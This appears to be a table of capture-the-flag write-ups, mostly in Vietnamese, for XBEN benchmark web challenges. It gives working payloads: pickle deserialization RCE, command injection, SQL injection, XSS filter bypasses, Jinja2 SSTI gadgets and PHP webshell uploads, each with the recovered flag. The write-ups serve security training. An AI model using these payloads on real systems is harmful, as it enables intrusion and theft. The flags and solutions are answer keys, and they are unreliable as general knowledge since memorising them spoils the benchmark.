XBEN-036-24,1,RCE,"XBEN-036-24 RCE
1. Truy cập vào website. Đọc nội dung html ta thấy
if os.path.exists('decoy.txt'):
flag = open('decoy.txt').read()
else:
flag = open('flag.txt').read()
=> sever sẽ tự in ra flag nếu xóa được decoy.txt
2. Tạo code python
import os
import pickle

class RCE:
def __reduce__(self):
return (os.system, (""rm decoy.txt"",))

with open(""rm.pkl"", ""wb"") as f:
pickle.dump(RCE(), f)
3. Chạy code python
4. Upload file rm.pkl lên
5. Lấy được flag{f96e0e03-a965-4c0d-a9dd-dccb9dfcb22c}"
XBEN-037-24,1,Blind Command Injection,"[XBEN-037-24] Blind Command Injection
1. Truy cập vào trang chính thấy có form nhập IP
2. Thử với 127.0.0.1 | cat flag.txt nhưng không hiệu quả. Output không được in ra (blind)
3. Dùng payload ghi file ra static 127.0.0.1; cat /FLAG.txt > static/flag.txt
4. Truy cập đến http://ip:port/static/flag.txt nhận được flag là flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}"
XBEN-039-24,1,"SQLi, Privilege Escalation","[XBEN-039-24]
1. Truy cập vào IP:PORT
2. Tìm thấy Element a href trỏ đến Admin Login
3. Dùng payload SQLi username=admin' or '1'='1'--, password=any
4. Server trả về flag flag{c969819d-7a14-4c90-b85d-51eccd232580}"
XBEN-041-24,1,#NAME?,"XBEN-041-24
Truy cập trang có form upload → upload test.jpg để kiểm tra, thấy file được lưu và truy cập được tại `/upload/test.jpg` → kết luận thư mục `/upload/` public. 
Tạo webshell `<?php system($_GET[""cmd""]); ?>` lưu thành `shell.php` → upload `shell.php` qua form (giữ nguyên đuôi `.php`) → truy cập `http://host:<port>/upload/shell.php` thấy trang trắng (không 404/403) → thêm `?cmd=id` để kiểm tra RCE, ví dụ: `http://host:<port>/upload/shell.php?cmd=id` và nhận output `uid=33(www-data)...` → xác nhận RCE → dùng payload đọc flag, ví dụ: 
`http://host:<port>/upload/shell.php?cmd=cat%20/flag.txt` 
hoặc tận dụng biến môi trường theo hint: 
`http://host:<port>/upload/shell.php?cmd=echo%20$FLAG`.
"
XBEN-045-24,1,Blind Command Injection,"[XBEN-045-24] Blind Command Injection
1. Truy cập vào trang chính thấy có form nhập IP
2. Thử với 127.0.0.1 | cat flag.txt nhưng không hiệu quả, | đã bị chặn
3. Thử với 127.0.0.1; cat flag.txt được nhưng không có flag được in ra chỉ có kết quả của ping => đã bị filter output
4. Tạo echo để giả vờ làm output của ping => Dùng payload sau ; f=$(cat /FLAG.txt); echo ""$f packets transmitted, 2 received, 0% packet loss""
5. Nhận được flag: flag{780e393f-6041-41c0-a7e4-bb025c76ef6e}
"
XBEN-047-24,1,XSS,"[XBEN-047-24] XSS
1. Truy cập vào trang chính thấy có nút chuyển hướng đến /page
2. Truy cập vào /page tìm thấy param url.
3. Dùng BurpSuite bắt gói request đưa vào repeater. Điền thử payload <script>XSS</script>. Sau đó gửi request đi thì ta thấy chỉ còn scriptXSS/script tức là < > đã bị filter
4. Tiếp tục encode payload %3Cscript%3Ealert(""XSS"")%3C/script%3E nhưng vẫn bị filter
5. Cố gắng double encode ta được %253Cscript%253Ealert(""XSS"")%253C/script%253E và response trả về được %3Cscript%3Ealert(XSS)%3C/script%3E => Đã bypass filter
6. Do src của iframe mong đợi 1 url hợp lệ nên %253Cscript%253Ealert(""XSS"")%253C/script%253E sẽ không hợp lệ để thực thi -> cần thêm data:text/html
7. Gửi payload cuối cùng là data:text/html,%253Cscript%253Ealert('XSS')%253C/script%253E ta được flag là flag{7aa5167c-aaad-4587-b76c-044ae6107e7a}"
XBEN-052-24,1,Privilege Escalation,"[XBEN-052-24] - Privilege Escalation
1. curl website và tìm thấy form đăng nhập bao gồm username, password và isAdmin
2. Tạo lệnh curl method Post để đăng nhập với body là username=admin, password=admin và isAdmin=true
3. Nhận được flag FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}</h3></center></body>
"
XBEN-053-24,1,SSTI,"XBEN-053-24
Truy cập trang chủ với tham số username và nhận thấy giá trị truyền vào được render trực tiếp ra HTML. Thử payload {{7*7}} thì trang trả về 49, 
xác nhận tồn tại lỗ hổng Server-Side Template Injection (SSTI) trên Jinja2. Do biến config không tồn tại trong context, 
mình sử dụng gadget cycler để truy cập __globals__ và lấy module os. Payload {{cycler.__init__.__globals__['os'].popen('ls').read()}} 
giúp liệt kê thư mục và phát hiện file flag.txt. Cuối cùng, thay lệnh ls bằng cat flag.txt với payload {{cycler.__init__.__globals__['os'].popen('cat flag.txt').read()}} để đọc nội dung flag trực tiếp trên trang.
Thành công lấy được flag của thử thách."
XBEN-058-24,1,IDOR,"XBEN-058-24
Sau khi truy cập trang web, mình thấy trang login có gợi ý tài khoản thử nghiệm: Username: demo, Password: demo, nên dùng luôn cặp demo/demo để đăng nhập. 
Đăng nhập thành công, ứng dụng chuyển hướng đến trang danh sách job với URL dạng /company/1/jobs và hiển thị các job thuộc “Company 1”. 
Nhìn vào URL có tham số dạng ID công ty (/company/1/jobs), mình nghi đây là kiểu truy cập tài nguyên theo ID và có khả năng bị Insecure Direct Object Reference (IDOR) nếu backend không kiểm tra quyền của user theo company tương ứng. 
Từ đó, mình thử thay số 1 trong URL thành 2, truy cập thủ công: /company/2/jobs. Trang vẫn load bình thường, lần này tiêu đề đổi thành “Jobs for Company 2” và ngoài các job bình thường còn xuất hiện thêm một mục “secret” chứa flag: secret:FLAG{ef9d74447312d7c3d6273f6be7d69abe30b4c8e42bd9ca9002086be3f038d3b0}. Như vậy chỉ với quyền user demo, nhưng bằng cách đoán và thay đổi trực tiếp ID trong URL, mình đã đọc được dữ liệu nhạy cảm (flag) của company khác → khẳng định đây là lỗi Broken Access Control / IDOR trên endpoint /company/<id>/jobs do không ràng buộc session với company_id tương ứng"
XBEN-070-24,1,XSS,"XBEN-070-24
1. Access the target application at http://<TARGET_IP>:<PORT> and identify a link to /page
2. Navigate to /page and identify a form with a POST parameter named solution
3. Submit a basic input such as test and observe how the application responds
4. Observe that different inputs lead to different visual or response outputs, indicating input-dependent processing
5. Inspect the response and confirm that user input is reflected in the HTML output
6. Determine that the reflected input is not filtered or encoded
7. Identify that the input is injected into an HTML context after an <input> tag
8. Test HTML injection by submitting simple tags and confirm they are rendered
9. Test basic JavaScript payloads such as <script>alert(1)</script> to evaluate script execution behavior
10. Confirm that arbitrary JavaScript execution is possible in the application context
11. Construct a payload that triggers a visible JavaScript dialog using <script>alert('XSS')</script>
12. Submit the payload via POST request to /page with parameter solution=<script>alert('XSS')</script>
13. Observe that the payload executes successfully in the rendered response context
14. Observe that successful execution leads to a different response indicating challenge completion
15. Extract the flag from the response content"
XBEN-076-24,1,SSTI,"XBEN-076-24
1. Access main page at http://<TARGET_IP>:<PORT>/ and observe a form with input field for name
2. Send request to /greet?name=test and observe the name parameter is reflected in the response as Hello, test!
3. Test SSTI payload {{7*7}} via /greet?name={{7*7}} and observe output Hello, 49! indicating template injection
4. Identify from application hints or behavior that sensitive files may be located in the /tmp directory
5. Construct SSTI payload to read local file /tmp/flag using template injection primitives
6. Encode the payload and send request to /greet?name=<encoded_payload>
7. Observe that the response contains the result of the injected payload execution
8. Confirm that the response includes the flag within the greeting message
9. Extract the flag from the response output"
XBEN-102-24,1,Default Credentials,"XBEN-102-24
-Curl trang chính và tìm được trong HTML default Credentials <!-- test:test --> và form đăng nhập
- Đăng nhập với default credentital được cung cấp curl -i -s -X POST http://192.168.1.57:32770/login -d 'username=test&password=test' để nhận được cookie và <a href=""/profile"">/profile</a>.
- Dùng lại cookie để curl vào /profile curl -i -s http://192.168.1.57:32770/profile -H ""Cookie: session=eyJ1c2VybmFtZSI6InRlc3QifQ.aTO88Q.BJAtYe_wpbpCqanxQyFgm5lWgjE""
- Ở đây tìm được 1 form cho phép đổi email và có 1 thẻ input username bị hidden. Gửi curl -i -X POST -s http://192.168.1.57:32770/profile -H ""Cookie: session=eyJ1c2VybmFtZSI6InRlc3QifQ.aTO88Q.BJAtYe_wpbpCqanxQyFgm5lWgjE"" -d 'email=attacker@gmain.com&username=admin' để thay đổi username thành admin, lúc này flag hiện ra flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}"
XBEN-001-24,2,"IDOR, Default Credentials","XBEN-001-24 – IDOR - Trading Platform - Authorization

1. Truy cập trang login và đăng nhập bằng tài khoản mặc định test:test (comment HTML gợi ý).
2. Sau khi đăng nhập, vào /orders và chọn một order bất kỳ. Gửi request sang Burp Intruder.
3. Xác định endpoint dễ bị IDOR:
GET /order/300481/receipt
→ Order ID không có kiểm soát phân quyền.
4. Trong Intruder → Positions: đánh dấu Order ID:
/order/§300481§/receipt
5. Trong Payloads: chọn Numbers, From 300000 đến 300999, Step 1.
6. Start attack. Quan sát Response Length để tìm request khác biệt.
7. Payload 300401 trả về response dài hơn. Mở Response xem nội dung.
8. Flag xuất hiện bên trong HTML:
FLAG{114d882be44233f043ec6dc69015345467e8da14230d836991f801f63483aef312}
"
XBEN-002-24,2,"IDOR, Default Credentials","XBEN-002-24 – IDOR (Indirect) – Trading Platform – Authorization

1. Truy cập trang login và đăng nhập bằng tài khoản mặc định test:test.
2. Vào /orders và lấy một request “Archive” bất kỳ, ví dụ:
GET /order/300214/archive
Gửi request này sang Burp Intruder.
3. Trong Intruder → Positions: đánh dấu Order ID:
/order/§300214§/archive
4. Trong Payloads: chọn Numbers, From 300000 đến 300999, Step 1.
5. Start attack để fuzz toàn bộ Order ID trong khoảng 300000–300999.
6. Sau fuzz xong, mở lại trang /orders_archive trong trình duyệt để xem các order đã bị “archive”.
→ Do lỗi IDOR, các order của user khác (không phải test) đã bị gán sang user test.
7. Trong danh sách mới xuất hiện Order ID 300198. Click “Receipt” của order này để tải nội dung:
GET /order/300198/receipt
8. Flag nằm trong phần nội dung của receipt:
FLAG{7ef0f69d2883bb79dd210f4b4bc3b26a1d8c3d615294a2ee6cc3a81c2c5b7fa}
"
XBEN-003-24,2,Default Credentials,"XBEN-003-24
1. Fuzz lần 1 lấy username là test
2. Đăng nhập với username là test và password là test được userid là 10032
3. Do tên bài là CustomHeader => Ta sẽ xóa các thông tin còn lại(username, password, cookie) để Fuzz Header với id là 10032. Tìm được X-UserId
4. Tiếp theo lại fuzz X-UserId với giá trị tăng dần từ 10000. Ở 10052 nhận được flag là flag{59347331-8678-4dab-a060-ac47807b71a5}
"
XBEN-004-24,2,XSS,"[XBEN-4-24] XSS
1. Truy cập trang web tại http://<IP>:<PORT>/ và quan sát giao diện. Tại đây có một thẻ <a> dẫn đến trang nhập nội dung.

2. Click vào đường dẫn đó để mở trang chứa ô input nơi dữ liệu được phản chiếu trực tiếp ra HTML.

3. Nhập payload XSS bắt buộc phải chứa chuỗi ""XSS"" in hoa: <input type=text autofocus onfocus=alert(""XSS"") rồi submit.
4. Khi submit, popup XSS xuất hiện, chứng minh khai thác thành công: XSS. Tiếp tục click OK
5. Tìm được flag"
XBEN-008-24,2,XSS,"XBEN-008-24
1. Truy cập website
2. Tìm thấy element duy nhất cho phép redirect.
3. Click element đó.
4. Tìm thấy element cho phép nhập input duy nhất.
5. Điền vào element đó. Thử payload XSS cơ bản: <script>alert(1)</script> → bị chặn vì có script.
6. Thử event phổ biến: <img src=x onerror=alert(1)> và <img onload=alert(1)> → đều bị chặn vì onerror và onload bị filter.
7. Thử SVG: <svg onload=alert(1)> → bị chặn; <svg><script>…</script></svg> → chặn do chứa script.
8. Thử javascript: protocol → bị chặn do substring javascript.
9. Kiểm tra ký tự quote → ' bị chặn, "" không bị chặn.
10. Kiểm tra event còn sống → thử <input autofocus onfocus=alert(""XSS"")> → chạy được vì onfocus không bị block.
11. Flag là flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}"
XBEN-011-24,2,XSS,"1. Access main page at http://<TARGET_IP>:<PORT>/ and identify a link to /page
2. Navigate to /page and observe a POST form with input field solution that is reflected in the response
3. Submit basic payload <script>alert('XSS')</script> and observe that the script tag is removed
4. Submit payload <img src=x onerror=alert('XSS')> and observe that the img tag is removed
5. Submit payload <image src=x onerror=alert('XSS')> and observe that whitespace is stripped causing payload corruption
6. Infer that only the image tag is allowed while other tags are filtered
7. Infer that all whitespace characters are removed from the input
8. Test alternative payload structures without whitespace and observe how they are reflected in the response
9. Construct payload using image tag without whitespace such as <image/src/onerror=alert('XSS')>
10. Submit the crafted payload via POST request with parameter solution=<image/src/onerror=alert('XSS')>
11. Observe that the payload is reflected in the response without being removed
12. Observe that the injected event handler is successfully triggered during page rendering
13. Confirm successful exploitation based on the application returning a success response
14. Extract the flag from the response content"
XBEN-012-24,2,XSS,"XBEN-012-24
1. Tiến hành gửi nhận payload bằng burpsuite để xem sự biến đổi giữa payload trong request và trong response.
1. Thử <script>alert(""XSS"")</script> thấy <s bị lọc ra còn cript>alert(""XSS"")</script>
2. Thử <img ...> thì <i bị lọc còn mg>....>
3. Thử javascript:alert(""XSS"") thì toàn bộ chuỗi ""XSS"" bị lọc còn javascript:alert() => javascript dùng được
4. Kế thừa ở trên dùng javascript:alert(String.fromCharCode(88,83,83)) ta thấy payload đã không bị filter nữa tuy nhiên vì nó nằm trong value của input nên nó không được thực thi.
5. Để thoát khỏi value ta cần 1 ngoặc "" để đóng value và thêm attribute autofocus để nhận giá trị alert(String.fromCharCode(88,83,83)) - Lúc này không cần ""javascript:"" nữa vì đã có autofocus.
6. Gửi payload cuối cùng "" onfocus=alert(String.fromCharCode(88,83,83)) x="" và nhận được flag: FLAG{64699b06af18be8aa11d1cffbaa67820d88f3b7d3b5d53ab95f9eff3796117d9}
"
XBEN-016-24,2,XSS,"XBEN-016-24
Thử <script>alert('XSS')</script> ta thấy server cấm chuỗi script
Dựa vào kinh nghiệm ở nhiều chall trước, onfocus hầu như không bị cấm
Tạo được payload <img onfocus=alert('XSS')>
Tuy nhiên lần này bị cấm ' '(space)
Thay bằng <img/onfocus=alert('XSS')> nhưng ' bị cấm
Thay bằng <img/onfocus=alert(""XSS"")>"
XBEN-017-24,2,XSS,"1. Access main page at http://<TARGET_IP>:<PORT> and identify a link to /page
2. Send request to /page?name=test and observe the name parameter is reflected in the HTML response
3. Inspect the reflection and determine it appears inside the value attribute of an input element
4. Test basic payload <script>alert('XSS')</script> and observe that the string XSS is removed from the response
5. Infer the presence of a blacklist filter targeting specific keywords in the input
6. Test variations of the payload to understand filtering behavior and identify possible bypass patterns
7. Determine that the injection occurs within an HTML attribute and can be escaped using a double quote
8. Construct a payload that breaks out of the value attribute and injects an event handler with obfuscated JavaScript
9. Use string concatenation in the payload to bypass keyword filtering such as combining characters to form XSS
10. Send the crafted payload via /page?name=<payload>
11. Observe that the payload is successfully injected and executed when the page is processed
12. Extract the flag from the response content"
XBEN-025-24,2,"SSTI, Default Credentials","XBEN-025-24
Truy cập /accounts/register/step1 và nhập name={{flag}} cùng password tùy ý rồi submit. Tiếp tục sang /accounts/register/step2 và nhập email bất kỳ để hoàn tất bước 2. Sau đó truy cập /accounts/register/step3, trang sẽ thực thi payload template và hiển thị flag trong popup. Lấy flag từ thông báo hiện ra để hoàn thành thử thách.
"
XBEN-028-24,2,"LFI
RCE","XBEN-028-24
Upload webshell PHP để đạt RCE:
printf '<?php echo shell_exec($_GET[""c""] ?? """"); ?>' > /tmp/cmd.php
curl -s -F 'name=ctfer' -F 'email=test@example.com' -F 'articleFile=@/tmp/cmd.php;filename=cmd.php' http://ip:port/posts/upload-article.php

Truy cập webshell:
curl -s 'http://ip:port/posts/uploads/cmd.php?c=id'

Kết hợp LFI qua post.php để gọi shell:
curl -s 'http://ip:port/post.php?id=uploads/cmd&c=whoami'

Dò vị trí flag bằng webshell:
curl -s 'http://ip:port/post.php?id=uploads/cmd&c=find%20/%20-maxdepth%203%20-iname%20flag*%20-type%20f'

Đọc flag khi tìm thấy /FLAG.txt:
curl -s 'http://ip:port/post.php?id=uploads/cmd&c=cat%20/FLAG.txt'

Kết quả trả về:
FLAG{9ed98c4ebcf85ee4c0c9aad626949981a8a7725ddf507d20b6701b7442bdd294}
"
XBEN-029-24,2,Blind SQLi,"RECON:
1. Locate the login form on the target application
EXPLOIT:
2. Test for time-based SQL injection on the login functionality by injecting delay-based payloads
3. Observe response delays to confirm SQL injection vulnerability
4. Enumerate the database name using time-based SQL injection techniques
5. Extract valid username and password data from the database using SQL injection
6. Use the obtained credentials to authenticate via the login form
7. Identify the file upload functionality after successful login
8. Upload a malicious file to achieve remote code execution and read the flag from the system"
XBEN-038-24,1,SQLi,"[XBEN-038-24] SQLite Injection – Bypass Logic Check to Access Private Jobs
1. Truy cập trang web tại http://<IP>:<PORT> và quan sát chức năng Job Search gửi POST /jobs với JSON body:
""query"":""\n query {\n jobs(jobType: \""private\"") {\n id\n name\n type\n description\n }\n }\n 

2. Với job_type là private ta nhận status code 403. Qua đó ta thấy server sẽ trả về 403 nếu chuỗi job_type là private

3. Để bypass logic trên ta sẽ tạo 1 chuỗi SQLi: private' -- . Lúc này job type sẽ khác private tuy nhiên khi vào SQL query nó có nghĩa tương đương.

4. Gửi lại POST request với query được chỉnh sửa như sau(Thay jobType từ private thành private' --):
{""query"":""\n query {\n jobs(jobType: \""private' -- \"") {\n id\n name\n type\n description\n }\n }\n ""}

5. Server trả về flag:
FLAG{435c23214a55a86fb4767013da8e1ac61feffa0ccfea01a5289b84effb8fbebd}"
XBEN-040-24,2,Blind SQLi,"1. Access the target application at http://<TARGET_IP>:<PORT> and observe the blog homepage with category filtering functionality
2. Navigate to http://<TARGET_IP>:<PORT>/admin.php and identify the admin login form requiring username and password
3. Return to the main page and send request with category=Tech to observe normal behavior
4. Inject a single quote using category=Tech' and observe a change in application response
5. Confirm a potential SQL injection vulnerability based on differing behavior between normal and injected inputs
6. Test additional crafted inputs to observe response differences based on query conditions
7. Identify the objective of extracting admin credentials from the backend database
8. Send payload category=Tech' AND 1=1-- - and observe that the response remains consistent with valid queries
9. Send payload category=Tech' AND 1=2-- - and observe that the response differs or returns no results
10. Use conditional queries to verify the existence of the admins table via category=Tech' AND (SELECT COUNT(*) FROM admins)>0-- -
11. Craft payload to extract data from the admins table using SQL injection techniques
12. Send request with the crafted payload targeting retrieval of the admin password
13. Observe that the response contains database output or error-based information revealing part of the password
14. Extract the admin password value from the response content
15. Navigate to http://<TARGET_IP>:<PORT>/admin.php and submit the login form with retrieved credentials
16. Observe that authentication is successful and access to the admin interface is granted
17. Extract the flag from the admin page"
